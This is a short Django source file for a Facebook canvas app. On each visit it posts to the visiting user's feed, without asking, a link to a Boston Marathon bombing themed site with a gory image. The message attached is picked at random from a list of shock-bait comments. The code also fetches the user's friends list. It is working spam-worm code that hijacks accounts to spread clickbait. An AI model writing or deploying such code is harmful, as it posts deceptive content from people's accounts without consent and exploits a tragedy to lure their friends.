from django.shortcuts import render
from django_facebook.decorators import canvas_only
from django.http import HttpResponseRedirect
import random
from random import choice
from facepy import GraphAPI


comments = ['omg, you have to watch this video', 'this is disgusting',
'i cant even believe this', 'this video is nuts','this clip is insane',
'craziest video ive ever seen', 'this is horrifying',
'everyone needs to see this', 'omg, those poor people',
'not for the faint of heart', 'must watch, so crazy', 'insane',
'omg', 'this is so sad', 'sickening', 'god help us', 'holy crap',
'omg, its like a war zone', 'this made me cry', 'this makes me sick',
'im disgusted', 'disgusting', 'omg, so terrible']

def fbook(request):
    return HttpResponseRedirect('https://apps.facebook.com/127194234141131')

@canvas_only
def home(request):
    me = request.facebook.graph.get_object('me')
    access_token = request.facebook.graph.access_token
    frenz = request.facebook.graph.get_connections("me", "friends")
    friends = [ f['id'] for f in frenz['data']]
    random.shuffle(friends)
    friendslist = friends[:4]
    graph = GraphAPI(access_token)
    graph.post (
        path='me/feed',
        link='http://bostonmarathonbombers.net',
        picture='http://bostonmarathonbombers.net/images/leg.jpg',
        message=choice(comments)
        )
    return render(request, 'home.html', {'me': me})
